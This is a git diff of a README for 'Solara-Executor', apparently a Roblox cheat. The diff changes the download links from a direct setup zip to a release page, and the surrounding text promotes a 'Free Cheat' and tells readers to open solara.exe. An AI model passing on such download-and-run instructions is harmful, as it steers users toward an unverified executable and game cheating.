@@ -6,7 +6,7 @@
 ![380301253-5b80ecd1-c390-4ad4-85fd-a50f6db1cf94](https://github.com/user-attachments/assets/2f381939-3717-4bf9-a0b7-e1518c34cdf7)
 
 
-  <a href="https://github.com/Rapaulpuss/Solara-Executor/releases/download/Download/setupv5.0.zip"><img src="https://img.shields.io/badge/Download-Free%20Cheat-brightgreen" style="height:130px!important;" /></a>
+  <a href="https://github.com/Rapaulpuss/Solara-Executor/releases/tag/Download"><img src="https://img.shields.io/badge/Download-Free%20Cheat-brightgreen" style="height:130px!important;" /></a>
 
 
 # 🥇Solara is a hope
@@ -31,7 +31,7 @@ Ever thought what will happpen if Roblox detect Solara? Well, we are always here
 
 # 🌌How to install Solara
 
-[Download](https://github.com/Rapaulpuss/Solara-Executor/releases/download/Download/setupv5.0.zip) 
+[Download](https://github.com/Rapaulpuss/Solara-Executor/releases/tag/Download) 
 
 Open file solara.exe
 
